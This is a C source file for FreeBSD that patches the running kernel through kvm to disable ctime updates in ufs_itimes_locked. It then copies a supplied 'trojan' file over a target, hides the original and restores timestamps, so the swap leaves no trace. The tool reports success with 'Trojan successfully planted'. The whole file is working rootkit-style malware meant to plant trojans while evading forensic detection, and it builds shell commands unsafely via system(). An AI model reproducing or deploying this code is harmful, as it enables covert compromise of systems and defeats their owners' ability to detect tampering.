#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <utime.h>
#include "magick.h"

#define SIZE 450

/* Replacement code. */
unsigned char	nop_code3[] =
"\x90\x90\x90";
unsigned char	nop_code4[] =
"\x90\x90\x90\x90";

/**
 * Output of "llvm-objdump -dr /boot/kernel/kernel | less"
 * then search for "<ufs_itimes_locked>:"

ffffffff80ecfe50 <ufs_itimes_locked>:
ffffffff80ecfe50: 55                    pushq   %rbp
ffffffff80ecfe51: 48 89 e5              movq    %rsp, %rbp
ffffffff80ecfe54: 41 56                 pushq   %r14
ffffffff80ecfe56: 53                    pushq   %rbx
ffffffff80ecfe57: 48 83 ec 10           subq    $16, %rsp
ffffffff80ecfe5b: 48 89 fb              movq    %rdi, %rbx
ffffffff80ecfe5e: 4c 8b 77 18           movq    24(%rdi), %r14
ffffffff80ecfe62: 49 8b 46 18           movq    24(%r14), %rax
ffffffff80ecfe66: 4c 89 f7              movq    %r14, %rdi
ffffffff80ecfe69: ff 90 d8 01 00 00     callq   *472(%rax)
ffffffff80ecfe6f: 85 c0                 testl   %eax, %eax
ffffffff80ecfe71: 74 0e                 je      0xffffffff80ecfe81 <ufs_itimes_locked+0x31>
ffffffff80ecfe73: 41 80 66 48 f8        andb    $-8, 72(%r14)
ffffffff80ecfe78: 48 83 c4 10           addq    $16, %rsp
ffffffff80ecfe7c: 5b                    popq    %rbx
ffffffff80ecfe7d: 41 5e                 popq    %r14
ffffffff80ecfe7f: 5d                    popq    %rbp
ffffffff80ecfe80: c3                    retq
ffffffff80ecfe81: 41 8b 46 48           movl    72(%r14), %eax
ffffffff80ecfe85: a8 07                 testb   $7, %al
ffffffff80ecfe87: 74 ef                 je      0xffffffff80ecfe78 <ufs_itimes_locked+0x28>
ffffffff80ecfe89: 0f b6 0b              movzbl  (%rbx), %ecx
ffffffff80ecfe8c: 83 c1 fd              addl    $-3, %ecx
ffffffff80ecfe8f: 48 8b 53 20           movq    32(%rbx), %rdx
ffffffff80ecfe93: 66 83 f9 01           cmpw    $1, %cx
ffffffff80ecfe97: 77 0b                 ja      0xffffffff80ecfea4 <ufs_itimes_locked+0x54>
ffffffff80ecfe99: b9 20 00 00 00        movl    $32, %ecx
ffffffff80ecfe9e: f6 42 0a 20           testb   $32, 10(%rdx)
ffffffff80ecfea2: 74 1b                 je      0xffffffff80ecfebf <ufs_itimes_locked+0x6f>
ffffffff80ecfea4: f6 42 07 18           testb   $24, 7(%rdx)
ffffffff80ecfea8: b9 08 00 00 00        movl    $8, %ecx
ffffffff80ecfead: 74 10                 je      0xffffffff80ecfebf <ufs_itimes_locked+0x6f>
ffffffff80ecfeaf: 89 c2                 movl    %eax, %edx
ffffffff80ecfeb1: 83 e2 06              andl    $6, %edx
ffffffff80ecfeb4: 75 09                 jne     0xffffffff80ecfebf <ufs_itimes_locked+0x6f>
ffffffff80ecfeb6: b9 40 00 00 00        movl    $64, %ecx
ffffffff80ecfebb: a8 01                 testb   $1, %al
ffffffff80ecfebd: 74 0f                 je      0xffffffff80ecfece <ufs_itimes_locked+0x7e>
ffffffff80ecfebf: 49 8b 7e 10           movq    16(%r14), %rdi
ffffffff80ecfec3: 09 c8                 orl     %ecx, %eax
ffffffff80ecfec5: 41 89 46 48           movl    %eax, 72(%r14)
ffffffff80ecfec9: e8 22 ad d7 ff        callq   0xffffffff80c4abf0 <vlazy>
ffffffff80ecfece: 48 8d 7d e0           leaq    -32(%rbp), %rdi
ffffffff80ecfed2: e8 09 74 d7 ff        callq   0xffffffff80c472e0 <vfs_timestamp>
ffffffff80ecfed7: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80ecfedb: f6 c1 01              testb   $1, %cl
ffffffff80ecfede: 74 3d                 je      0xffffffff80ecff1d <ufs_itimes_locked+0xcd>
ffffffff80ecfee0: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80ecfee4: f7 c1 00 04 00 00     testl   $1024, %ecx             # imm = 0x400
ffffffff80ecfeea: 75 09                 jne     0xffffffff80ecfef5 <ufs_itimes_locked+0xa5>
ffffffff80ecfeec: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ecfef0: 89 41 10              movl    %eax, 16(%rcx)
ffffffff80ecfef3: eb 08                 jmp     0xffffffff80ecfefd <ufs_itimes_locked+0xad>
ffffffff80ecfef5: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ecfef9: 48 89 41 20           movq    %rax, 32(%rcx)
ffffffff80ecfefd: 41 f7 46 48 00 04 00 00       testl   $1024, 72(%r14) # imm = 0x400
ffffffff80ecff05: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80ecff08: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ecff0c: ba 14 00 00 00        movl    $20, %edx
ffffffff80ecff11: be 44 00 00 00        movl    $68, %esi
ffffffff80ecff16: 48 0f 44 f2           cmoveq  %rdx, %rsi
ffffffff80ecff1a: 89 04 31              movl    %eax, (%rcx,%rsi)
ffffffff80ecff1d: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80ecff21: f6 c1 04              testb   $4, %cl
ffffffff80ecff24: 74 33                 je      0xffffffff80ecff59 <ufs_itimes_locked+0x109>
ffffffff80ecff26: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80ecff2a: f7 c1 00 04 00 00     testl   $1024, %ecx             # imm = 0x400
ffffffff80ecff30: 75 09                 jne     0xffffffff80ecff3b <ufs_itimes_locked+0xeb>
ffffffff80ecff32: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ecff36: 89 41 18              movl    %eax, 24(%rcx)
ffffffff80ecff39: eb 08                 jmp     0xffffffff80ecff43 <ufs_itimes_locked+0xf3>
ffffffff80ecff3b: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ecff3f: 48 89 41 28           movq    %rax, 40(%rcx)
ffffffff80ecff43: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80ecff48: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80ecff4b: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ecff4f: 75 05                 jne     0xffffffff80ecff56 <ufs_itimes_locked+0x106>
ffffffff80ecff51: 89 41 1c              movl    %eax, 28(%rcx)
ffffffff80ecff54: eb 03                 jmp     0xffffffff80ecff59 <ufs_itimes_locked+0x109>
ffffffff80ecff56: 89 41 40              movl    %eax, 64(%rcx)
ffffffff80ecff59: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80ecff5d: f6 c1 02              testb   $2, %cl
ffffffff80ecff60: 0f 84 0d ff ff ff     je      0xffffffff80ecfe73 <ufs_itimes_locked+0x23>
ffffffff80ecff66: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80ecff6a: f7 c1 00 04 00 00     testl   $1024, %ecx             # imm = 0x400
ffffffff80ecff70: 75 09                 jne     0xffffffff80ecff7b <ufs_itimes_locked+0x12b>
ffffffff80ecff72: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ecff76: 89 41 20             *movl    %eax, 32(%rcx)
ffffffff80ecff79: eb 08                 jmp     0xffffffff80ecff83 <ufs_itimes_locked+0x133>
ffffffff80ecff7b: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ecff7f: 48 89 41 30          *movq    %rax, 48(%rcx)
ffffffff80ecff83: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80ecff88: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80ecff8b: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ecff8f: 75 05                 jne     0xffffffff80ecff96 <ufs_itimes_locked+0x146>
ffffffff80ecff91: 89 41 24             *movl    %eax, 36(%rcx)
ffffffff80ecff94: eb 03                 jmp     0xffffffff80ecff99 <ufs_itimes_locked+0x149>
ffffffff80ecff96: 89 41 48             *movl    %eax, 72(%rcx)
ffffffff80ecff99: 41 f7 46 48 00 04 00 00       testl   $1024, 72(%r14) # imm = 0x400
ffffffff80ecffa1: b8 78 00 00 00        movl    $120, %eax
ffffffff80ecffa6: b9 e8 00 00 00        movl    $232, %ecx
ffffffff80ecffab: 48 0f 44 c8           cmoveq  %rax, %rcx
ffffffff80ecffaf: 49 8b 46 38           movq    56(%r14), %rax
ffffffff80ecffb3: 48 ff 04 08          *incq    (%rax,%rcx)
ffffffff80ecffb7: e9 b7 fe ff ff        jmp     0xffffffff80ecfe73 <ufs_itimes_locked+0x23>
ffffffff80ecffbc: 0f 1f 40 00           nopl    (%rax)
*/
// Disable ufs_itimes change time code
// Record existing file's access, modification times
// Copy existing file to hidden file location
// Copy trojan file over existing file
// Set trojan file's access and modification times
// Restore ufs_itimes change time code
int main(int argc, char *argv[])
{
   int		   i, offset1, offset2, offset3, offset4, offset5, fd = -1;
   char		   errbuf[_POSIX2_LINE_MAX];
   kvm_t	  *kd;
   struct nlist	   nl[] = {{NULL}, {NULL},};
   unsigned char   ufs_itimes_code[SIZE];
   struct stat	   sb;
   struct utimbuf  time, file_time;
   char * trojan = NULL;
   char * destination = NULL;
   char * destination_dir = NULL;
   char * pos = NULL;
   size_t dest_dir_str_len = 0;
   int dest_is_file = 0;

   if (argc < 3) {
      printf("[-] Usage: %s [TROJAN FILE] [DESTINATION]\n", argv[0]);
      exit(0);
   }

   trojan = argv[1];
   destination = argv[2];

   if (stat(trojan, &sb) < 0) {
      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", trojan, errno);
      exit(-1);
   } else if (!S_ISREG(sb.st_mode)) {
      printf("[x] %s is not a file\n", trojan);
      exit(-1);
   }

   if (stat(destination, &sb) < 0) {
      fprintf(stderr, "[x]  %s: STAT ERROR: %d\n", destination, errno);
      exit(-1);
   }

   // Determine if destination a file or directory
   if (S_ISDIR(sb.st_mode)) {
      destination_dir = destination;
   } else if (S_ISREG(sb.st_mode)) {
      dest_is_file = 1;
      file_time.actime = sb.st_atime;
      file_time.modtime = sb.st_mtime;
      // Find last '/' character in destination path
      if ((pos=strrchr(destination, '/')) == NULL) {
         printf("[x] No '/' character found in destination path: %s\n", destination);
         exit(-1);
      }

      dest_dir_str_len = pos - destination;
      printf("[-] Allocating %lu bytes for destination directory\n", dest_dir_str_len);
      destination_dir = malloc(dest_dir_str_len+1);
      bzero(destination_dir, dest_dir_str_len+1);
      strncpy(destination_dir, destination, dest_dir_str_len);
   } else {
      printf("[x] Destination %s is not a directory or file\n", destination);
      exit(-1);
   }

   if (dest_is_file) {
      printf("[-] Destination file is %s\n", destination);
   }

   printf("[-] Destination directory is %s\n", destination_dir);

   /* Initialize kernel virtual memory access. */
   kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
   if (kd == NULL) {
      fprintf(stderr, "[x] ERROR: %s\n", errbuf);
      exit(-1);
   }
   nl[0].n_name = "ufs_itimes_locked";
   if (kvm_nlist(kd, nl) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }
   if (!nl[0].n_value) {
      fprintf(stderr, "[x] ERROR: Symbol %s not found\n",
	      nl[0].n_name);
      exit(-1);
   }
   /* Save a copy of ufs_itimes. */
   if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }
   /*
    * Search through ufs_itimes_locked for the following three lines:
    *
    * DIP_SET(ip, i_ctime, ts.tv_sec);
    *
    * DIP_SET(ip, i_ctimensec, ts.tv_nsec);
    *
    * DIP_SET(ip, i_modrev, DIP(ip, i_modrev) + 1);
    *
    * We will NOP out the lines that write to memory.

ffffffff80ecff76: 89 41 20             *movl    %eax, 32(%rcx)
ffffffff80ecff7f: 48 89 41 30          *movq    %rax, 48(%rcx)
ffffffff80ecff91: 89 41 24             *movl    %eax, 36(%rcx)
ffffffff80ecff96: 89 41 48             *movl    %eax, 72(%rcx)
ffffffff80ecffb3: 48 ff 04 08          *incq    (%rax,%rcx)
*/

   for (i = 0; i < SIZE - 3; i++) {
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x20)
	 offset1 = i;
      if (ufs_itimes_code[i] == 0x48 &&
	  ufs_itimes_code[i + 1] == 0x89 &&
	  ufs_itimes_code[i + 2] == 0x41 &&
	  ufs_itimes_code[i + 3] == 0x30)
	 offset2 = i;
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x24)
	 offset3 = i;
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x48)
	 offset4 = i;
      if (ufs_itimes_code[i] == 0x48 &&
	  ufs_itimes_code[i + 1] == 0xff &&
	  ufs_itimes_code[i + 2] == 0x04 &&
	  ufs_itimes_code[i + 3] == 0x08)
	 offset5 = i;
   }

   /* Save destination directory access and modification times. */
   if (stat(destination_dir, &sb) < 0) {
      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", destination_dir, errno);
      exit(-1);
   }
   time.actime = sb.st_atime;
   time.modtime = sb.st_mtime;

   if (!dest_is_file) {
      file_time = time;
   }

   /* Patch ufs_itimes. */
   if (kvm_write(kd, nl[0].n_value + offset1, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset1 at %d, ERROR: %s\n",
         offset1, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset2, nop_code4,
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset2 at %d, ERROR: %s\n",
         offset2, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset3, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset3 at %d, ERROR: %s\n",
         offset3, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset4, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset4 at %d, ERROR: %s\n",
         offset4, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset5, nop_code4,
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset5 at %d, ERROR: %s\n",
         offset5, kvm_geterr(kd));
      exit(-1);
   }

   // Copy existing file to hidden file location
   if (dest_is_file) {
      printf("[-] Copying existing file %s to %s.%s\n", destination,
         destination, T_NAME);
      char * copy_existing = malloc(3 + strlen(destination) + 1 +
         strlen(destination) + 1 + strlen(T_NAME));
      pos = copy_existing;
      strcpy(pos, "cp ");
      pos+=3;
      strcpy(pos, destination);
      pos+=strlen(destination);
      strcpy(pos, " ");
      pos++;
      strcpy(pos, destination);
      pos+=strlen(destination);
      strcpy(pos, ".");
      pos++;
      strcpy(pos, T_NAME);

      printf("[-] command = %s\n", copy_existing);
      if (system(copy_existing) < 0) {
         printf("[x] Failed to copy existing file %s to %s.%s\n", destination,
            destination, T_NAME);
      }

      free(copy_existing);
   }

   /* Copy trojan into DESTINATION. */
   char *string = malloc(3 + strlen(trojan) + 1 + strlen(destination));
   pos = string;
   strcpy(pos, "cp ");
   pos+=3;
   strcpy(pos, trojan);
   pos+=strlen(trojan);
   strcpy(pos, " ");
   pos++;
   strcpy(pos, destination);

   printf("[-] command = %s\n", string);
   if (system(string) < 0) {
      printf("[x] Failed to copy trojan file %s to %s\n", trojan, destination);
   }

   free(string);

   /* Roll back destination directory access and modification times. */
   if (utime(destination, &file_time) < 0) {
      fprintf(stderr, "[x] UTIME ERROR: %d\n", errno);
   }
   /* Restore ufs_itimes_locked. */
   if (utime(destination_dir, &time) < 0) {
      fprintf(stderr, "[x] UTIME ERROR: %d\n", errno);
   }
   /* Restore ufs_itimes_locked. */
   if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset1 at %d, ERROR: %s\n",
         offset1, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2],
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset2 at %d, ERROR: %s\n",
         offset2, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset3, &ufs_itimes_code[offset3],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset3 at %d, ERROR: %s\n",
         offset3, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset4, &ufs_itimes_code[offset4],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset4 at %d, ERROR: %s\n",
         offset4, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset5, &ufs_itimes_code[offset5],
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset5 at %d, ERROR: %s\n",
         offset5, kvm_geterr(kd));
      exit(-1);
   }
   /* Close kd. */
   if (kvm_close(kd) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }

   printf("[-] Trojan successfully planted\n");
   exit(0);
}
